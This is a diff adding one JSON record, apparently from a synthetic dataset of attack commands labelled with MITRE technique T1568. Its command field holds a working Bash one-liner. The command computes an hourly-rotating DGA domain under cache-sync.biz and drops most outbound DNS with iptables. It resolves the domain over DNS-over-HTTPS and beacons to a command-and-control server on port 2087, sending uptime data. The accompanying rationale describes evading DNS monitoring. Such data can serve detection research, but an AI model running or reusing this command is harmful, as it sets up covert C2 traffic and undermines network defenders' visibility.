@@ -1,0 +1,23 @@
+{
+  "technique_id": "T1568",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "SEED=\"zeta\"; LABEL=$(printf \"%s\" \"${SEED}$(date -u +%Y%m%d%H)\" | sha1sum | cut -c1-10); FQDN=\"${LABEL}.cache-sync.biz\"; PORT=2087; iptables -A OUTPUT -p udp --dport 53 -m statistic --mode random --probability 0.7 -j DROP; sleep $((RANDOM%5)); curl -sSf --doh-url https://1.1.1.1/dns-query --user-agent \"curl/$(curl --version | awk 'NR==1{print $2}')\" \"https://${FQDN}:${PORT}/beacon?load=$(uptime | awk '{print $10}')\"",
+  "explanation": "Curtails traditional DNS egress to prefer DoH and resolves a time-rotated DGA domain, then beacons over port 2087 with a realistic curl user-agent.",
+  "rationale_steps": [
+    "Throttle UDP/53 to reduce observable DNS",
+    "Compute hourly-shifting DGA domain",
+    "Resolve via DoH to bypass local DNS",
+    "Beacon to C2 on nonstandard port 2087"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1568-a69367b6-79d0ce73",
+  "source_prompt_hash": "a69367b6",
+  "timestamp_utc": "2025-09-30T09:31:37.018067Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
